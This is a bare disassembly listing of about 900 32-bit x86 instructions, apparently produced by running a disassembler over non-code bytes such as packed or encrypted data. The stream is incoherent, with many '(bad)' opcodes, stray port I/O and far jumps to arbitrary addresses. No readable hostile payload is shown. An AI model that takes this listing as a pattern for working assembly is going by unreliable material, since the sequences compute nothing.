  412cb7:	mov    cl,0xf5
  412cb9:	or     DWORD PTR [ecx],ebx
  412cbb:	aam    0xe5
  412cbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412cbe:	mov    al,0xc8
  412cc0:	enter  0x9870,0x9d
  412cc4:	pop    esp
  412cc5:	inc    ebx
  412cc6:	out    0xf0,eax
  412cc8:	nop
  412cc9:	mov    esp,0x6c9f25af
  412cce:	cmp    ebx,DWORD PTR [edi]
  412cd0:	sti    
  412cd1:	jo     0x412ce0
  412cd3:	gs hlt 
  412cd5:	xchg   ebx,eax
  412cd6:	(bad)  
  412cd7:	pop    ebx
  412cd8:	call   0xb7d2ddf4
  412cdd:	scas   al,BYTE PTR es:[edi]
  412cde:	push   edi
  412cdf:	adc    eax,0x44dfe669
  412ce4:	dec    esp
  412ce5:	loopne 0x412d52
  412ce7:	loopne 0x412ce4
  412ce9:	pop    es
  412cea:	cmp    ecx,esp
  412cec:	scas   eax,DWORD PTR es:[edi]
  412ced:	jb     0x412cde
  412cef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412cf0:	cdq    
  412cf1:	xchg   ecx,eax
  412cf2:	(bad)  
  412cf3:	retf   
  412cf4:	fisubr DWORD PTR [edi]
  412cf6:	cmp    eax,0x58a44382
  412cfb:	add    BYTE PTR [ecx],ah
  412cfd:	jae    0x412d1b
  412cff:	imul   eax,DWORD PTR [ecx+ecx*4-0x1a],0x70
  412d04:	int    0x63
  412d06:	out    dx,eax
  412d07:	std    
  412d08:	pop    ebx
  412d09:	out    dx,eax
  412d0a:	jge    0x412cbe
  412d0c:	inc    edx
  412d0d:	mov    DWORD PTR [ecx],edi
  412d0f:	mov    ch,0x17
  412d11:	(bad)  
  412d12:	lock imul edi,DWORD PTR [ecx+0x21c35cd4],0x71
  412d1a:	jle    0x412d2b
  412d1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d1d:	dec    esp
  412d1e:	add    ecx,DWORD PTR [ecx]
  412d20:	push   esp
  412d21:	fld    TBYTE PTR [ebx-0x68116bc5]
  412d27:	lods   al,BYTE PTR ds:[esi]
  412d28:	pop    ebx
  412d29:	into   
  412d2a:	cmp    DWORD PTR [esi+0x56],eax
  412d2d:	cmc    
  412d2e:	jp     0x412d19
  412d30:	push   es
  412d31:	imul   edx,esi,0xa64c4948
  412d37:	mov    bh,0x7f
  412d39:	popf   
  412d3a:	rcl    BYTE PTR [edi-0x1a715181],1
  412d40:	daa    
  412d41:	fdiv   st,st(1)
  412d43:	jbe    0x412cf5
  412d45:	int    0x10
  412d47:	rol    DWORD PTR [ebp-0x3a],cl
  412d4a:	(bad)  ds:[esi-0x45]
  412d4e:	mov    ds:0x7cd2de4b,al
  412d53:	and    BYTE PTR [eax-0x1e],0x16
  412d57:	pop    ebp
  412d58:	imul   DWORD PTR [esi+0x2d]
  412d5b:	lds    esi,FWORD PTR ds:0xcdfcd3f8
  412d61:	xchg   ebp,eax
  412d62:	or     BYTE PTR [ebp+0x6f8180d],bl
  412d68:	xor    dl,BYTE PTR [edx]
  412d6a:	(bad)  
  412d6b:	jns    0x412d59
  412d6d:	pop    eax
  412d6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d6f:	jp     0x412d81
  412d71:	call   DWORD PTR [edi-0x29b96be3]
  412d77:	frstor ds:0xaa5d762
  412d7d:	int    0xed
  412d7f:	add    bl,BYTE PTR [esi]
  412d81:	cld    
  412d82:	jo     0x412d5a
  412d84:	iret   
  412d85:	jbe    0x412dd3
  412d87:	shl    BYTE PTR [ebp+0x263c960b],1
  412d8d:	fnstcw WORD PTR ds:0x274fabf5
  412d93:	xor    bh,BYTE PTR [edi+0x35]
  412d96:	push   esi
  412d97:	add    al,0xa5
  412d99:	dec    BYTE PTR [ebx+ebx*1-0x225f595]
  412da0:	js     0x412d43
  412da2:	jb     0x412e23
  412da4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412da5:	mov    bl,0x96
  412da7:	jg     0x412e0f
  412da9:	rcr    DWORD PTR [ebp-0x6b],cl
  412dac:	shl    DWORD PTR [esi-0x2b],cl
  412daf:	mov    ch,0x9c
  412db1:	jns    0x412e1a
  412db3:	sbb    DWORD PTR [edi+ebp*4],esp
  412db6:	cmp    bh,BYTE PTR [ebx+0x69d225e3]
  412dbc:	pop    es
  412dbd:	std    
  412dbe:	call   0xe0dd3e0
  412dc3:	sub    ecx,DWORD PTR [ecx+0x43]
  412dc6:	pop    es
  412dc7:	ja     0x412dae
  412dc9:	ret    
  412dca:	retf   
  412dcb:	repnz into 
  412dcd:	call   0x31a2:0x3b531976
  412dd4:	jg     0x412e09
  412dd6:	adc    DWORD PTR [esi+0x34],esp
  412dd9:	and    BYTE PTR [ebx],al
  412ddb:	popa   
  412ddc:	das    
  412ddd:	enter  0x3add,0x49
  412de1:	ins    BYTE PTR es:[edi],dx
  412de2:	int3   
  412de3:	icebp  
  412de4:	xor    eax,0x72b6327b
  412de9:	xchg   ebp,eax
  412dea:	push   es
  412deb:	or     DWORD PTR [ebp+esi*8+0x70],0x2992b386
  412df3:	scas   eax,DWORD PTR es:[edi]
  412df4:	inc    ebx
  412df5:	push   esp
  412df6:	push   esi
  412df7:	adc    eax,ecx
  412df9:	fdiv   DWORD PTR [edi]
  412dfb:	sbb    eax,0x4656881d
  412e00:	lock in al,dx
  412e02:	pop    ecx
  412e03:	mov    DWORD PTR ds:0x68180698,esp
  412e09:	adc    eax,DWORD PTR [esi*8+0xf8699a7]
  412e10:	sbb    al,0xb3
  412e12:	icebp  
  412e13:	into   
  412e14:	and    eax,0xc27f7d5c
  412e19:	ins    BYTE PTR es:[edi],dx
  412e1a:	mov    bh,0x58
  412e1c:	jge    0x412e45
  412e1e:	pusha  
  412e1f:	js     0x412e47
  412e21:	lock lea edi,[edx+0x5]
  412e25:	outs   dx,DWORD PTR ds:[esi]
  412e26:	lods   eax,DWORD PTR ds:[esi]
  412e27:	or     bl,bl
  412e29:	shl    BYTE PTR [ebp+0x5032d967],0x88
  412e30:	ret    0xe39d
  412e33:	push   ds
  412e34:	bound  ebx,QWORD PTR [edx+0x7a63ad43]
  412e3a:	and    al,BYTE PTR [edx+0x34]
  412e3d:	add    cl,BYTE PTR [ecx-0x20]
  412e40:	iret   
  412e41:	mov    BYTE PTR [edi+0x4c4f4641],dh
  412e47:	nop
  412e48:	in     al,0x0
  412e4a:	sbb    DWORD PTR [ebx-0x59],edx
  412e4d:	test   al,0xec
  412e4f:	xchg   edi,ebp
  412e51:	outs   dx,DWORD PTR ds:[esi]
  412e52:	(bad)  
  412e53:	pop    ebx
  412e54:	mov    ds:0xafde6afb,al
  412e59:	xor    ebp,DWORD PTR [ecx-0x1a]
  412e5c:	hlt    
  412e5d:	sub    al,0xb6
  412e5f:	(bad)  [edi+0x48bcde9d]
  412e65:	sub    esp,DWORD PTR [ebx+0x5b]
  412e68:	je     0x412e0f
  412e6a:	mov    dh,0x5e
  412e6c:	aaa    
  412e6d:	stos   BYTE PTR es:[edi],al
  412e6e:	and    ah,BYTE PTR [edx+0x10]
  412e71:	jbe    0x412ed1
  412e73:	inc    edi
  412e74:	je     0x412e0f
  412e76:	call   0x1134761a
  412e7b:	retf   
  412e7c:	mov    dh,0xa2
  412e7e:	adc    esp,edi
  412e80:	push   cs
  412e81:	push   esp
  412e82:	stos   BYTE PTR es:[edi],al
  412e83:	push   DWORD PTR [ecx+0x5a]
  412e86:	retf   
  412e87:	scas   eax,DWORD PTR es:[edi]
  412e88:	daa    
  412e89:	sbb    edi,DWORD PTR [esi+0x46]
  412e8c:	lods   al,BYTE PTR ds:[esi]
  412e8d:	out    0xfb,al
  412e8f:	mov    ds:0x99d9cace,al
  412e94:	jmp    0x49f1:0xe715c850
  412e9b:	call   FWORD PTR [esi]
  412e9d:	xchg   esp,eax
  412e9e:	outs   dx,BYTE PTR ds:[esi]
  412e9f:	mov    ds:0x84355813,al
  412ea4:	ja     0x412e37
  412ea6:	xor    al,0x4b
  412ea8:	sbb    bh,BYTE PTR [edx+ebp*4]
  412eab:	dec    ebx
  412eac:	cli    
  412ead:	aas    
  412eae:	cmp    BYTE PTR ss:[eax],ch
  412eb1:	cwde   
  412eb2:	sbb    dh,cl
  412eb4:	(bad)  
  412eb5:	loopne 0x412eb8
  412eb7:	sti    
  412eb8:	outs   dx,BYTE PTR ds:[esi]
  412eb9:	out    dx,al
  412eba:	mov    esp,0x6d95eaec
  412ebf:	dec    esi
  412ec0:	and    BYTE PTR [edi+0xee33a95],0xef
  412ec7:	adc    DWORD PTR [ecx],0x5c84a8f
  412ecd:	sub    edi,edx
  412ecf:	push   es
  412ed0:	repnz add eax,0x9436e510
  412ed6:	daa    
  412ed7:	cmp    DWORD PTR [edi],eax
  412ed9:	adc    al,BYTE PTR [esi]
  412edb:	push   ecx
  412edc:	mov    ch,dl
  412ede:	adc    BYTE PTR ds:0xdb777415,ah
  412ee4:	xlat   BYTE PTR ds:[ebx]
  412ee5:	fld    DWORD PTR [ecx+edi*1-0x12f2fbb7]
  412eec:	(bad)  
  412eed:	cli    
  412eee:	mov    edi,0xd520a0b8
  412ef3:	cmp    eax,0x6853ab9e
  412ef8:	cmp    BYTE PTR [ebx+0x3e46ca19],cl
  412efe:	scas   eax,DWORD PTR es:[edi]
  412eff:	and    DWORD PTR [eax],esp
  412f01:	mov    al,0x47
  412f03:	icebp  
  412f04:	stos   DWORD PTR es:[edi],eax
  412f05:	fnstenv [edi+0x3e351b03]
  412f0b:	fdivr  QWORD PTR [bp+si-0x6652]
  412f10:	add    al,0xff
  412f12:	std    
  412f13:	push   es
  412f14:	fmul   DWORD PTR [ebp+0x543bfbba]
  412f1a:	pop    ecx
  412f1b:	je     0x412ecd
  412f1d:	inc    ebx
  412f1e:	jbe    0x412f2c
  412f20:	shl    BYTE PTR [edi-0x5eb1b52d],1
  412f26:	rol    BYTE PTR [edx+ecx*8+0x32],0xb3
  412f2b:	pop    ss
  412f2c:	mov    dl,0xad
  412f2e:	xor    ch,dl
  412f30:	pop    ebx
  412f31:	add    al,0xe5
  412f33:	xchg   esp,eax
  412f34:	test   DWORD PTR [ebx+0x4f7a9798],ecx
  412f3a:	sbb    edi,ebx
  412f3c:	fldcw  WORD PTR [ebp+0x5]
  412f3f:	cmp    edi,DWORD PTR [esi]
  412f41:	mov    ebx,0xdf9d0d60
  412f46:	pop    es
  412f47:	adc    DWORD PTR ds:0xe7f6312c,esp
  412f4d:	and    ah,BYTE PTR [edx]
  412f4f:	and    cl,BYTE PTR [edx+0x66c7cb62]
  412f55:	xchg   BYTE PTR [edi+eiz*4+0x222714f7],dh
  412f5c:	shl    DWORD PTR [eax+ebx*2],0x8b
  412f60:	pop    ebp
  412f61:	mov    al,ds:0x2bfdb0c1
  412f66:	add    esp,DWORD PTR [eax-0x5ab36a2e]
  412f6c:	adc    al,0x8c
  412f6e:	dec    eax
  412f6f:	adc    dl,bh
  412f71:	addr16 and eax,0x6956aa5f
  412f77:	add    DWORD PTR [ecx-0x4fd21f22],eax
  412f7d:	jo     0x412f4d
  412f7f:	sbb    DWORD PTR [ebp+eax*2+0x19],eax
  412f83:	cs mov esi,0x6831462a
  412f89:	push   ebp
  412f8a:	or     eax,0x1cfa1137
  412f8f:	jmp    0xce1167f1
  412f94:	jns    0x412f26
  412f96:	mov    dh,0xaa
  412f98:	push   esi
  412f99:	imul   edi,DWORD PTR [edx+0x157222b3],0x798bc1c2
  412fa3:	sbb    esp,DWORD PTR [edx]
  412fa5:	pop    edi
  412fa6:	mov    ch,0xaf
  412fa8:	sbb    al,0x95
  412faa:	inc    ecx
  412fab:	ds std 
  412fad:	or     BYTE PTR [edx-0x5],ch
  412fb0:	dec    edx
  412fb1:	(bad)  
  412fb3:	js     0x412fb7
  412fb5:	stos   DWORD PTR es:[edi],eax
  412fb6:	jo     0x412f6f
  412fb8:	sub    BYTE PTR [ecx-0x67],0x6f
  412fbc:	fbld   TBYTE PTR [ebx-0x52274ba9]
  412fc2:	xchg   ecx,eax
  412fc3:	sub    eax,0x35a00421
  412fc8:	frstor [esi-0x25]
  412fcb:	clc    
  412fcc:	(bad)  
  412fcd:	scas   al,BYTE PTR es:[edi]
  412fce:	mov    dh,BYTE PTR [ebx-0x2a]
  412fd1:	std    
  412fd2:	sub    al,0xca
  412fd4:	cmp    eax,ecx
  412fd6:	cmp    ecx,DWORD PTR [edx-0xf7b7d84]
  412fdc:	lea    ebx,[edi-0x3a]
  412fdf:	sub    al,0x88
  412fe1:	outs   dx,BYTE PTR ds:[esi]
  412fe2:	aad    0x33
  412fe4:	mov    edx,0x6fcbc6b7
  412fe9:	xchg   ebp,eax
  412fea:	pop    es
  412feb:	div    DWORD PTR [ecx+0x23a68a38]
  412ff1:	or     al,0x91
  412ff3:	ret    0x59a6
  412ff6:	pop    esp
  412ff7:	mov    esi,0x294f1b20
  412ffc:	test   eax,0x68649d3d
  413001:	sbb    esp,DWORD PTR [edx]
  413003:	in     al,0xc2
  413005:	repnz mov ds:0xc9c2d6ac,al
  41300b:	lahf   
  41300c:	test   bl,cl
  41300e:	jmp    0xaee7:0x80f0e8be
  413015:	lods   eax,DWORD PTR ds:[esi]
  413016:	and    eax,0xc0b28eef
  41301b:	adc    cl,bh
  41301d:	mov    bl,0xd5
  41301f:	push   esi
  413020:	jbe    0x41308f
  413022:	cld    
  413023:	mov    al,0x65
  413025:	out    0x76,al
  413027:	adc    al,0xc0
  413029:	dec    edi
  41302a:	repz js 0x412ff9
  41302d:	(bad)  
  41302e:	mov    dh,0xee
  413030:	and    eax,0x9330981c
  413035:	out    dx,al
  413036:	pop    ebx
  413037:	pushf  
  413038:	xchg   esi,eax
  413039:	mov    ch,BYTE PTR [esi-0x12]
  41303c:	rcr    BYTE PTR [eax+0x10],cl
  41303f:	xor    BYTE PTR [ecx+ecx*1+0x35],bh
  413043:	aas    
  413044:	mov    edi,0x6b891a17
  413049:	push   eax
  41304a:	sbb    eax,0x31ef0d67
  41304f:	mov    WORD PTR [edi],fs
  413051:	push   0x10
  413053:	shr    BYTE PTR [edx-0x748ef88e],0xdc
  41305a:	mov    bl,BYTE PTR [ecx+0x90df10]
  413060:	push   ss
  413061:	mov    eax,ds:0x94042ec
  413066:	sar    DWORD PTR [edi+ecx*1-0xe],1
  41306a:	push   0x73ade3c7
  41306f:	mov    edx,0x67e00937
  413074:	stos   BYTE PTR es:[edi],al
  413075:	xlat   BYTE PTR ds:[ebx]
  413076:	and    ebp,DWORD PTR [ebp+0x30b0ef76]
  41307c:	leave  
  41307d:	or     DWORD PTR [eax+0x1c],esi
  413080:	inc    eax
  413081:	js     0x41301d
  413083:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413084:	sbb    eax,0xa0cba3c
  413089:	sub    al,0xf2
  41308b:	mov    BYTE PTR [edx+0xf],bl
  41308e:	pop    es
  41308f:	inc    ecx
  413090:	or     edx,ecx
  413092:	retf   0xb694
  413095:	cmp    al,0x40
  413097:	adc    ebp,edi
  413099:	sub    BYTE PTR [esp+ecx*8+0x3b8b423d],bl
  4130a0:	add    al,0x57
  4130a2:	icebp  
  4130a3:	int3   
  4130a4:	xchg   edx,eax
  4130a5:	and    esi,DWORD PTR [edx]
  4130a7:	repnz stos DWORD PTR es:[edi],eax
  4130a9:	loop   0x4130b8
  4130ab:	(bad)  
  4130ac:	ss sahf 
  4130ae:	rcr    BYTE PTR [esi+0x52],0x2
  4130b2:	jo     0x4130f3
  4130b4:	add    BYTE PTR [eax-0x2b],ah
  4130b7:	in     eax,dx
  4130b8:	loop   0x4130ad
  4130ba:	inc    ebp
  4130bb:	xchg   DWORD PTR [ebx+0x6550e6c],edx
  4130c1:	jmp    0x2258:0xdefe25d2
  4130c8:	jl     0x413050
  4130ca:	or     BYTE PTR [esi],cl
  4130cc:	add    eax,0x4ea2dda9
  4130d1:	std    
  4130d2:	xchg   ebx,eax
  4130d3:	arpl   sp,dx
  4130d5:	icebp  
  4130d6:	pop    ebp
  4130d7:	adc    al,0x23
  4130d9:	mov    esi,0x632a6f0a
  4130de:	lea    ebx,[edx+0x4279187a]
  4130e4:	mov    BYTE PTR [ecx+ecx*8-0x17],0x78
  4130e9:	inc    esi
  4130ea:	push   0x0
  4130ec:	not    BYTE PTR [eax-0x8]
  4130ef:	(bad)  
  4130f0:	push   ss
  4130f1:	(bad)  
  4130f2:	cmc    
  4130f3:	jnp    0x413167
  4130f5:	rcl    DWORD PTR [eax+0x7d3762b0],0xd0
  4130fc:	icebp  
  4130fd:	adc    al,0x68
  4130ff:	sub    edx,DWORD PTR [eax-0x44a8738]
  413105:	mov    ch,0xc1
  413107:	add    eax,0x623ace66
  41310c:	mov    ebx,0x9d17146e
  413111:	dec    ecx
  413112:	rcr    al,1
  413114:	dec    edi
  413115:	pop    ecx
  413116:	jg     0x413182
  413118:	call   0x5318f2e9
  41311d:	jge    0x41314a
  41311f:	push   esi
  413120:	fidivr DWORD PTR [eax-0x30b52695]
  413126:	mov    ebp,0xfbf27038
  41312b:	dec    eax
  41312c:	imul   edi,DWORD PTR [ebx],0xffffff81
  41312f:	mov    ds:0x7d1d5913,eax
  413134:	add    BYTE PTR [ecx-0x11],0xec
  413138:	jmp    0x413124
  41313a:	adc    BYTE PTR [ebx],bh
  41313c:	cli    
  41313d:	jno    0x413108
  41313f:	enter  0x1596,0x59
  413143:	enter  0x7f28,0xa8
  413147:	fs into 
  413149:	dec    ebx
  41314a:	push   es
  41314b:	dec    ebx
  41314c:	fwait
  41314d:	sbb    al,0x69
  41314f:	xchg   edi,eax
  413150:	in     al,dx
  413151:	stos   BYTE PTR es:[edi],al
  413152:	(bad)  
  413153:	xchg   esi,eax
  413154:	push   0xffffffbd
  413156:	pop    ds
  413157:	sbb    edx,DWORD PTR [ebx]
  413159:	sbb    eax,0x29720069
  41315e:	rol    edi,1
  413160:	cld    
  413161:	cmp    BYTE PTR es:[edx+0x61],dh
  413165:	out    dx,al
  413166:	int3   
  413167:	stc    
  413168:	add    DWORD PTR [esi+0x3defd4d],ebx
  41316e:	push   ds
  41316f:	jo     0x41314d
  413171:	sti    
  413172:	jl     0x413187
  413174:	outs   dx,DWORD PTR ds:[esi]
  413175:	jmp    0xe614e849
  41317a:	mov    ah,0xb
  41317c:	xchg   esi,eax
  41317d:	add    al,0x2
  41317f:	mov    cl,0x3b
  413181:	adc    BYTE PTR [ebx],0x9
  413184:	imul   ecx,DWORD PTR [ebx+edx*4+0x23],0x903ae0e4
  41318c:	jbe    0x413193
  41318e:	jle    0x413163
  413190:	aam    0xba
  413192:	fnsave [ebx]
  413194:	jo     0x413124
  413196:	sbb    DWORD PTR [eax+edi*4+0x33f50e0f],0xcb3a539
  4131a1:	jo     0x4131f1
  4131a3:	popf   
  4131a4:	mov    ch,0x67
  4131a6:	push   esi
  4131a7:	stc    
  4131a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131a9:	add    ch,al
  4131ab:	ret    0x9f01
  4131ae:	ret    0x541b
  4131b1:	ss mov dl,0x7e
  4131b4:	xor    DWORD PTR [eax+0x61],esi
  4131b7:	repnz gs (bad) 
  4131ba:	pop    eax
  4131bb:	mov    eax,ds:0x6da9e5
  4131c0:	daa    
  4131c1:	loop   0x413223
  4131c3:	stos   DWORD PTR es:[edi],eax
  4131c4:	push   ecx
  4131c5:	fstp   DWORD PTR [ecx+0xf]
  4131c8:	pop    es
  4131c9:	jb     0x413231
  4131cb:	pop    edx
  4131cc:	ret    
  4131cd:	mov    gs,WORD PTR [ebx-0x8]
  4131d0:	fbstp  TBYTE PTR [ecx]
  4131d2:	sbb    BYTE PTR [eax-0x586dc596],bh
  4131d8:	mov    eax,0x2864dcce
  4131dd:	shl    BYTE PTR [edi-0x66],1
  4131e0:	sub    eax,0x3b713dc6
  4131e5:	js     0x413201
  4131e7:	dec    ebp
  4131e8:	cmp    ebx,ecx
  4131ea:	pop    edi
  4131eb:	repz xchg esi,eax
  4131ed:	mov    ch,0x89
  4131ef:	or     al,0xb
  4131f1:	or     eax,eax
  4131f3:	xchg   edi,eax
  4131f4:	or     al,0xf5
  4131f6:	fs das 
  4131f8:	mov    esp,0x14a53f4e
  4131fd:	pop    esp
  4131fe:	ret    0x78f9
  413201:	add    DWORD PTR [ebp+ecx*1-0x71149971],edx
  413208:	neg    ebp
  41320a:	mov    ds:0x5197bd92,eax
  41320f:	ss sub BYTE PTR es:[eax],bl
  413213:	xor    al,0x42
  413215:	dec    edx
  413216:	cmp    edx,DWORD PTR [esi+0x1531bce]
  41321c:	mov    al,ds:0x8661468f
  413221:	sahf   
  413222:	xor    BYTE PTR [esi+ecx*2-0x16],0xd7
  413227:	repz in eax,dx
  413229:	fisttp QWORD PTR [eax]
  41322b:	add    eax,0xe745840e
  413230:	jl     0x413229
  413232:	iret   
  413233:	adc    DWORD PTR [edi],0x7a
  413236:	out    0x8d,al
  413238:	add    dl,dh
  41323a:	std    
  41323b:	in     eax,0x8f
  41323d:	push   ecx
  41323e:	jge    0x41324d
  413240:	test   eax,0x398f64af
  413245:	pop    dx
  413247:	sar    BYTE PTR [ebp-0x34],0xfe
  41324b:	add    eax,0xd7fe5428
  413250:	les    esp,FWORD PTR [ebx+0x73]
  413253:	mov    dl,0x3a
  413255:	lahf   
  413256:	push   ss
  413257:	adc    al,0xc4
  413259:	mov    ebx,0xd06988ce
  41325e:	pop    ds
  41325f:	sub    DWORD PTR [edx-0x60],0xffffffb9
  413263:	push   esp
  413264:	cmp    DWORD PTR [ebx+0xabd0852],ebp
  41326a:	call   0xe607fe98
  41326f:	gs pop edx
  413271:	scas   eax,DWORD PTR es:[edi]
  413272:	sub    dl,ah
  413274:	(bad)  
  413275:	aad    0x7e
  413277:	div    BYTE PTR [edi]
  413279:	or     esi,DWORD PTR [esi]
  41327b:	xchg   edi,eax
  41327c:	sbb    eax,0xc998b0f5
  413281:	add    esp,DWORD PTR [edx+0x1dc1acd4]
  413287:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413288:	fnstsw WORD PTR [ebx+edx*2]
  41328b:	pop    ss
  41328c:	inc    ebp
  41328d:	inc    ecx
  41328e:	xor    eax,0x386d5ba7
  413293:	lods   eax,DWORD PTR ds:[esi]
  413294:	ins    DWORD PTR es:[edi],dx
  413295:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413296:	(bad)  
  413297:	push   ss
  413298:	mov    ds:0x382c8208,al
  41329d:	adc    ah,BYTE PTR [ebp+0x2c]
  4132a0:	cli    
  4132a1:	push   0xffffffbc
  4132a3:	or     al,0x8b
  4132a5:	push   cs
  4132a6:	xchg   ebx,eax
  4132a7:	icebp  
  4132a8:	inc    esp
  4132a9:	arpl   WORD PTR [ebx+0x15b158cb],sp
  4132af:	xchg   esi,eax
  4132b0:	push   esi
  4132b1:	mov    ebp,0xbb80cbb7
  4132b6:	dec    ebp
  4132b7:	(bad)  
  4132b8:	clc    
  4132b9:	sbb    BYTE PTR [ebp-0x4181ed31],al
  4132bf:	lods   eax,DWORD PTR ds:[esi]
  4132c0:	adc    DWORD PTR [esi],eax
  4132c2:	test   al,0xcb
  4132c4:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  4132c6:	adc    DWORD PTR [esi+0x7a],0x2d34854e
  4132cd:	out    dx,eax
  4132ce:	rcr    BYTE PTR [edi+0x16],1
  4132d1:	hlt    
  4132d2:	repz pushf 
  4132d4:	pop    es
  4132d5:	xchg   DWORD PTR ds:0x8fc36196,esp
  4132db:	mov    ebp,0x554cf7a3
  4132e0:	push   esi
  4132e1:	and    eax,0x7e59177
  4132e6:	or     BYTE PTR [ecx-0x3],0xc1
  4132ea:	dec    ebx
  4132eb:	and    al,0x41
  4132ed:	mov    ebx,0xd6fdbd4e
  4132f2:	xor    DWORD PTR [edx-0x57e5a0ba],ecx
  4132f8:	mov    edi,0xf6ac630e
  4132fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4132fe:	and    esi,DWORD PTR [bp+si]
  413301:	mov    esi,0xfd43d4
  413306:	adc    edi,DWORD PTR [esi-0x45e5df79]
  41330c:	cli    
  41330d:	pop    edx
  41330e:	test   BYTE PTR gs:[ecx+0x45b61c99],ah
  413315:	dec    eax
  413316:	mov    eax,0x658f0ac8
  41331b:	push   edi
  41331c:	mov    eax,0xe754b66b
  413321:	nop
  413322:	aaa    
  413323:	cmc    
  413324:	jnp    0x4132b1
  413326:	sbb    eax,DWORD PTR [esi+edx*4+0x7c]
  41332a:	cmp    BYTE PTR [ebp+0x57],al
  41332d:	ficomp DWORD PTR [eax]
  41332f:	aaa    
  413330:	cwde   
  413331:	cld    
  413332:	jmp    0xc5e25e3c
  413337:	(bad)  
  413338:	retf   
  413339:	sbb    ebp,0xffffff91
  41333c:	iret   
  41333d:	add    ch,BYTE PTR [ecx+0x38a4c6cd]
  413343:	daa    
  413344:	and    BYTE PTR [edx-0x67],ah
  413347:	out    0x25,eax
  413349:	dec    ebx
  41334a:	(bad)  
  41334b:	pop    ss
  41334c:	(bad)  
  41334e:	retf   0x50ba
  413351:	adc    DWORD PTR ds:0x17c1e3f,esp
  413357:	ins    DWORD PTR es:[edi],dx
  413358:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413359:	push   cs
  41335a:	fwait
  41335b:	out    0x59,al
  41335d:	fstp   QWORD PTR [eax]
  41335f:	push   0xffffff95
  413361:	lods   eax,DWORD PTR ds:[esi]
  413362:	and    edi,DWORD PTR [esi+0x19]
  413365:	mov    ds:0x274c002c,al
  41336a:	retf   
  41336b:	scas   eax,DWORD PTR es:[edi]
  41336c:	mov    edi,0xb18b9be
  413371:	aaa    
  413372:	xor    eax,0x33264b70
  413377:	cld    
  413378:	daa    
  413379:	cmp    al,0x6f
  41337b:	pop    es
  41337c:	sub    DWORD PTR [edi-0x64],0x5e57d9db
  413383:	fcmovnb st,st(5)
  413385:	pop    esp
  413386:	cmp    edi,esi
  413388:	adc    DWORD PTR [eax+0x58],esi
  41338b:	xor    esi,DWORD PTR [esi+0x14]
  41338e:	cld    
  41338f:	inc    ebp
  413390:	xor    DWORD PTR [edi+esi*1],esp
  413393:	mov    edx,0xfb12d7e2
  413398:	stos   DWORD PTR es:[edi],eax
  413399:	je     0x4133b0
  41339b:	ret    0x1e6f
  41339e:	inc    ecx
  41339f:	mov    ds:0x96c4bacb,al
  4133a4:	mov    edx,0xfa97bd73
  4133a9:	outs   dx,DWORD PTR ds:[esi]
  4133aa:	sbb    eax,0xa81d09ab
  4133af:	jo     0x4133d1
  4133b1:	jmp    0x55a2:0x7fb718ea
  4133b8:	jno    0x413363
  4133ba:	scas   eax,DWORD PTR es:[edi]
  4133bb:	jno    0x41337c
  4133bd:	add    dl,0x6f
  4133c0:	(bad)  [edi]
  4133c2:	xor    eax,0xb1b975ae
  4133c7:	adc    al,0xa
  4133ca:	pop    eax
  4133cb:	or     al,0xe1
  4133cd:	push   0xfffffff1
  4133cf:	fsub   QWORD PTR [esi+0x39]
  4133d2:	add    al,BYTE PTR [esi+0x76]
  4133d5:	sbb    BYTE PTR [ecx+edi*8],dl
  4133d8:	ins    BYTE PTR es:[edi],dx
  4133d9:	xchg   BYTE PTR [ecx],ch
  4133db:	nop
  4133dc:	sub    ecx,DWORD PTR [eax+0x28812441]
  4133e2:	or     al,0xd
  4133e4:	jge    0x41344e
  4133e6:	xchg   edx,eax
  4133e7:	mov    dl,0x8
  4133e9:	adc    eax,0x250c15a1
  4133ee:	dec    ecx
  4133ef:	es sbb eax,DWORD PTR cs:[ecx+edi*4+0x2c6bd6aa]
  4133f8:	mov    bl,0x6
  4133fa:	loope  0x413429
  4133fc:	hlt    
  4133fd:	add    DWORD PTR [edi-0x63a53288],edi
  413403:	push   DWORD PTR [edx+0x5a]
  413406:	inc    ebp
  413407:	out    dx,eax
  413408:	mov    es,eax
  41340a:	xchg   ebp,eax
  41340b:	and    ah,ch
  41340d:	push   eax
  41340e:	ss rol ah,1
  413411:	cmp    ebx,esi
  413413:	pop    esi
  413414:	jg     0x4133b0
  413416:	cwde   
  413417:	and    esp,esi
  413419:	and    BYTE PTR [esi],0xa0
  41341c:	dec    edx
  41341d:	fwait
  41341e:	(bad)  
  41341f:	sub    BYTE PTR [edx],ch
  413421:	mov    bh,0x20
  413423:	inc    edi
  413424:	and    BYTE PTR [edx],dh
  413426:	xchg   ebp,esp
  413428:	mov    eax,0x683b4827
  41342d:	int3   
  41342e:	imul   ecx,DWORD PTR [ecx],0x8458ec42
  413434:	add    DWORD PTR [esi],eax
  413436:	retf   0xea19
  413439:	mov    bl,0x58
  41343b:	xor    edi,eax
  41343d:	add    al,0xc2
  41343f:	fimul  DWORD PTR [esi-0x37]
  413442:	in     al,0x6d
  413444:	cdq    
  413445:	rcpps  xmm4,XMMWORD PTR [eax-0x772409ce]
  41344c:	xor    eax,0x5689df8f
  413451:	ret    0x55aa
  413454:	cs fs pop eax
  413457:	xor    al,BYTE PTR [ebp+0x52edd5c2]
  41345d:	nop
  41345e:	pop    ebp
  41345f:	adc    ch,BYTE PTR [edi-0x20]
  413462:	rcr    BYTE PTR [eax-0x31954633],1
  413468:	(bad)  
  413469:	fisubr WORD PTR [edx+eiz*2-0x272c4d7a]
  413470:	call   0xc310:0xe9c0848a
  413477:	ss xchg ebp,eax
  413479:	in     eax,dx
  41347a:	cdq    
  41347b:	xchg   edi,eax
  41347c:	xor    ebp,ebp
  41347e:	and    esi,eax
  413480:	ret    
  413481:	shl    DWORD PTR gs:[ecx-0x51692075],cl
  413488:	call   0x5a63:0x7adcb403
  41348f:	pop    ebx
  413490:	das    
  413491:	mov    al,ds:0x70e1b2be
